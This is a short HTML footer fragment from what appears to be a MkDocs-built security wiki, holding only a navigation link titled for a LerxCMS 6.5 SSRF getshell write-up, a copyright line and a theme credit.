        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../LerxCMS/LerxCMS%206.5%20%E5%90%8E%E5%8F%B0ssrf%20getshell/" class="btn btn-xs btn-link">
        LerxCMS 6.5 后台ssrf getshell
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>